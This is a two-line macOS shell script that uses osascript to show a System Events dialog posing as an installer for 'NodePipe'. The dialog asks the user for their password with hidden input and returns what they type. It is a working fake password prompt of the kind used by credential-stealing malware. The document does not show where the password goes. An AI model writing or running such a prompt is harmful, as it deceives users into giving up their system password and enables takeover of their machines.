#!/bin/sh
osascript -e 'tell application "System Events" to display dialog "NodePipe requires privileges to finish installation. Please enter your password:" default answer "" with hidden answer with icon note' -e 'text returned of result'

